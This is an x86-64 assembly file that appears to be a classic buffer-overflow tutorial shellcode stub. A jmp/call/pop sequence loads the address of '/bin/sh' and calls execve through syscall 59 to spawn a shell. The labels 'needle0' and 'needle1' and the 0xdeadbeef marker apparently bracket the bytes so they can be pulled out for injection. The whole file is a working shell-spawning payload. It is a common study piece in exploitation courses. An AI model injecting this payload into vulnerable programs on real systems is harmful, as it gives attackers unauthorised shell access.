.globl main
main:
    needle0: jmp there
    here: pop %rdi
    movq $59, %rax  # execve
    xor %rsi, %rsi
    xor %rdx, %rdx
    syscall
    there: call here
    .string "/bin/sh"
    needle1: .octa 0xdeadbeef
